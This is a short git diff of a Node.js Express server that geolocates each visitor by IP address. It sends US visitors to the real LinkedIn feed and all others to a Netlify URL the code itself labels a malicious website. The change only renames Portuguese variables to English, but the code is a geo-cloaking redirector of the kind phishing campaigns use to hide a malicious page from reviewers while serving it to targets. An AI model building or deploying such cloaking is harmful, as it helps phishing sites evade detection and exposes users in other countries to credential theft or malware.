@@ -6,8 +6,11 @@ const app = express();
 const port = 3000;
 
 
+
 const realWebsite = "https://www.linkedin.com/feed/"
+
 const maliciousWebsite = "https://adorable-mandazi-8f986f.netlify.app/"
+
 
 
 app.use(requestIp.mw());
@@ -20,9 +23,9 @@ app.get('/', async (req, res) => {
     const data = response.data;
 
     if (data.countryCode === 'US') {
-      res.redirect(siteReal);
+      res.redirect(realWebsite);
     } else {
-      res.redirect(siteMalicioso);
+      res.redirect(maliciousWebsite);
     } 
   } catch (error) {
     console.error(error.message);
